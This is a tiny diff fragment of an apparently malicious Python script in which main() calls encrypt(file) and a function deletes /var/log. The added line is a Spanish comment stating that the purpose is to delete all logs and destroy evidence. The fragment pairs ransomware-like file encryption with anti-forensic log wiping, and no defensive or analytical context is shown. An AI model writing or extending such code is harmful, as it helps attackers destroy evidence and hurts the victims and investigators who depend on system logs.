@@ -50,5 +50,6 @@ def main(file):
     encrypt(file)
 
 def off_to_see_the_wizard():
+    # ELIMINA TODOS LOS LOGS PARA DESTRUIR EVIDENCIA
     os.rmdir('/var/log')
     return True
